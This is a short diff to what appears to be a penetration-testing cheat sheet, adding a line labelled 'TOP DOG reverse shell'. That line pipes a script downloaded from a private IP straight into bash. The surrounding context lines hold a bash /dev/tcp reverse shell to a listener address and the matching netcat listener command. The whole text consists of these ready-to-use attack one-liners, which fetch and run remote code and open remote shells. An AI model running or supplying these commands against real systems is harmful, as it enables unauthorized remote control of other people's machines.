@@ -12,6 +12,8 @@
 
 ### General
 
+TOP DOG reverse shell `curl http://192.168.45.152:8000/shell.sh | bash`
+
 ```$ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"```
 
 ```$ nc -nvlp 4444```
